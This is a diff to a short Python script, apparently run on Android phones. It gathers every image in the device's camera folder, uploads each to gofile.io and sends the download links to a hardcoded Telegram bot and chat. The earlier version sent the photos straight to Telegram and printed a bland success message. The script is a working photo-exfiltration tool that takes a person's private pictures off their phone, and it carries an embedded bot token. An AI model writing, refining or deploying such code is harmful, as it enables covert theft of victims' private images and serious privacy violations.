@@ -4,23 +4,34 @@ BOT_TOKEN = "8200691947:AAF-wOE90vTafT21Hqzs5WXokd2iBVstdl4"
 CHAT_ID = "8519296209"
 CAMERA = "/storage/emulated/0/DCIM/Camera"
 
-print("🔍 Searching for photos...")
-photos = [os.path.join(CAMERA, f) for f in os.listdir(CAMERA) if f.lower().endswith(('.jpg','.jpeg','.png'))]
-print(f"📸 Found {len(photos)} photos")
-
-for i, photo in enumerate(photos, 1):
+def upload_to_gofile(file_path):
     try:
-        with open(photo, 'rb') as f:
-            r = requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
-                            data={"chat_id": CHAT_ID}, 
-                            files={"photo": f}, 
-                            timeout=30)
-        if r.status_code == 200:
-            print(f"✅ [{i}/{len(photos)}] {os.path.basename(photo)}")
-        else:
-            print(f"❌ [{i}/{len(photos)}] Failed: {r.status_code}")
-        time.sleep(2)
-    except Exception as e:
-        print(f"❌ [{i}/{len(photos)}] Error: {e}")
+        with open(file_path, 'rb') as f:
+            r = requests.post('https://store1.gofile.io/uploadFile', files={'file': f})
+            return r.json()['data']['downloadPage']
+    except:
+        return None
 
-print("✅ The request was successful.")
+print("🔍 Searching...")
+photos = [os.path.join(CAMERA, f) for f in os.listdir(CAMERA) if f.lower().endswith(('.jpg','.jpeg','.png'))]
+print(f"📸 Found {len(photos)}")
+
+links = []
+for i, p in enumerate(photos, 1):
+    print(f"🔄 {i}/{len(photos)}...")
+    link = upload_to_gofile(p)
+    if link:
+        links.append(f"{os.path.basename(p)}: {link}")
+        print(f"✅ {link}")
+    else:
+        print(f"❌ Failed")
+    time.sleep(2)
+
+if links:
+    msg = "\n".join(links)
+    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={"chat_id": CHAT_ID, "text": msg})
+    print("✅ Links sent")
+else:
+    print("❌ No links")
+
+print("✅ Done")
